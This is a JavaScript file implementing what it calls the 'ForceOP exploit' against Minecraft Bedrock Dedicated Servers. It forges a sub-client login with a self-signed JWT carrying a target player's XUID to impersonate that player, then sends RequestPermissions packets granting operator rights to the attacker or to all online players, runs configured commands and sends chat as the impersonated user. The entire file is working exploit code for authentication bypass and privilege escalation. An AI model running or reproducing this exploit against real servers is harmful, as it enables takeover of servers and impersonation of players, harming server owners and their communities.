const JWT = require("jsonwebtoken");
const crypto = require("crypto");
const UUID = require("uuid");
const { createClient } = require("bedrock-protocol");
const BinaryStream = require("./BinaryStream.js");
const config = require("../config.json");

class Payload {
	subclientId = 1;
	botName = "ImpersonatedUser"

	/**
	 * @class
	 * @description Connect to a Bedrock Dedicated Server and use the ForceOP exploit with a given player XUID
	 * @param {string} targetXuid - The player XUID to impersonate that will be used to give ourselves operator
	 * @param {string} ip - The IP of the server to connect to
	 * @param {number} port - The port of the server to connect to
	 * @param {boolean} offline - If we should log in as an offline player
	 */
	constructor({ targetXuid, ip, port, offline = false }) {
		this.targetXuid = targetXuid;

		this.client = createClient({
			host: ip,
			port: port,
			profilesFolder: "./authCache/",
			offline: offline,
			// Incase 'offline' is set to true, the offline account will have a username of 'EliteElixir'
			username: "Test"
		});

		this.client.on("player_list", (playerList) => this.onPlayerList(playerList));
	}

	packetCount = 0;
	onPlayerList(playerList) {
		// The first PlayerList packet we receive only contains information about our current player, and the second PlayerList packet we receive contains info for all online players
		// If the 'opAll' config value is enabled, we will need to wait for the second PlayerList packet
		this.packetCount++;
		if(this.packetCount !== 2) return;
	
		console.log("We managed to get the PlayerList packet, we can now start the exploit");

		this.createSubClient();

		const records = playerList.records.records;

		for(const player of records) {
			if(!config.opAll && player.username != this.client.username) continue;

			console.log(`Giving operator to ${player.username}`);

			console.log(player.entity_unique_id);
			this.sendRequestPermissions(player.entity_unique_id, 4);
		}

		console.log("Running final actions:");

		for(const command of config.commands) {
			this.sendCommandRequest(command);
		}

		for(const message of config.messages) {
			this.sendText(message);
		}

		setTimeout(() => {
			this.client.disconnect();
		}, 500);
	}

	createSubClient() {
		// https://github.com/PrismarineJS/bedrock-protocol/blob/master/src/handshake/keyExchange.js#L13
		const { privateKey, publicKey } = crypto.generateKeyPairSync("ec", { namedCurve: "secp384r1" });
		const privateKeyPEM = privateKey.export({ format: "pem", type: "sec1" });
		const publicKeyDER = publicKey.export({ format: "der", type: "spki" });
		const clientX509 = publicKeyDER.toString("base64");

		const JWTOptions = {
			algorithm: "ES384",
			noTimestamp: true,
			notBefore: 0,
			// Our self signed JWT we create will only be valid for the next twenty four hours
			expiresIn: 60 * 60 * 24,
			header: {
				x5u: clientX509,
				typ: undefined
			}
		};

		const certificateChain = {
			extraData: {
				XUID: this.targetXuid,
				displayName: this.botName,
				identity: UUID.v4()
			},
			identityPublicKey: clientX509,
		};

		const identity = JWT.sign(certificateChain, privateKeyPEM, JWTOptions);
		const chain = [ identity ];

		const steveSkin = require("minecraft-data")("bedrock_1.19.70").defaultSkin;
		const userChain = {
			...steveSkin,

			ClientRandomId: Date.now(),
			CurrentInputMode: 1,
			DefaultInputMode: 1,
			DeviceID: UUID.v4(),
			DeviceOS: 7,
			PlatformOfflineId: "",
			PlatformOnlineId: "",
			PlatformUserId: UUID.v4(),
			PlayFabId: "",
			PrimaryUser: false,
			ThirdPartyName: this.botName,
			ThirdPartyNameOnly: false,
			TrustedSkin: true
		};

		const clientChain = JWT.sign(userChain, privateKeyPEM, JWTOptions);

		const packetHeader = new BinaryStream();
		// Send SubClientLogin packet (ID 94) for sub-client ID 1
		packetHeader.writeVarInt(this.createPacketId(94, 0, this.subclientId));

		const packetData = new BinaryStream();
		packetData.writeLEString(JSON.stringify({ chain }));
		packetData.writeLEString(clientChain);

		packetHeader.writeVarInt(packetData.length);
		packetHeader.writeBuffer(packetData.toBuffer());

		this.client.sendBuffer(packetHeader.toBuffer());
	}

	sendText(message) {
		const packetHeader = new BinaryStream();
		// Send Text packet (ID 9) for sub-client ID 1
		packetHeader.writeVarInt(this.createPacketId(9, 0, this.subclientId));

		const packetData = new BinaryStream();
		packetData.writeUInt8(1); // Chat Type
		packetData.writeBool(false); // Needs Translation
		packetData.writeVarintString(this.botName); // Username
		packetData.writeVarintString(message); // Message
		packetData.writeVarintString(this.targetXuid); // XUID
		packetData.writeVarintString(""); // Platform Chat ID

		packetHeader.writeBuffer(packetData.toBuffer());
		this.client.sendBuffer(packetHeader.toBuffer());
	}

	sendCommandRequest(command) {
		const packetHeader = new BinaryStream();
		packetHeader.writeVarInt(this.createPacketId(77, 0, 1));

		const packetData = new BinaryStream();
		packetData.writeVarintString(command); // Command

		// Command Origin
		packetData.writeVarInt(0); // Origin Source

		// UUIDs are 128 bits, so in the Minecraft Bedrock Protocol they are divided between two Int64s
		// UUID.parse returns a Uint8Array with 16 elements, but we can still write each element as a UInt8 without any problems
		const uuid = UUID.parse(UUID.v4());
		for(const u8 of uuid) {
			packetData.writeUInt8(u8); // Each part of the UUID
		}
		packetData.writeVarintString(""); // Request ID

		packetData.writeBool(false); // Internal
		packetData.writeVarInt(66); // Version

		packetHeader.writeBuffer(packetData.toBuffer());
		this.client.sendBuffer(packetHeader.toBuffer());
	}

	sendRequestPermissions(uniqueId, permissionLevel = 4) {
		const packetHeader = new BinaryStream();
		// Send RequestPermissions packet (ID 185) for sub-client ID 1
		packetHeader.writeVarInt(this.createPacketId(185, 0, this.subclientId));

		const packetData = new BinaryStream();
		packetData.writeBigInt64LE(uniqueId); // Unique ID
		packetData.writeVarInt(permissionLevel); // Permission level
		// Bitfield representation of available abilities
		packetData.writeUInt16LE(
			(1 << 0) | // Build
			(1 << 1) | // Mine
			(1 << 2) | // Doors and Switches
			(1 << 3) | // Open Containers
			(1 << 4) | // Attack Players
			(1 << 5) | // Attack Mobs
			(1 << 6) | // Operator
			(1 << 7)   // Teleport
		);

		packetHeader.writeBuffer(packetData.toBuffer());
		this.client.sendBuffer(packetHeader.toBuffer());
	}

	createPacketId(packetId, targetId = 0, senderId = 0) {
		return (packetId & 1023) |
			((targetId & 3) << 10) |
			((senderId & 3) << 12);
	}
}

module.exports = Payload;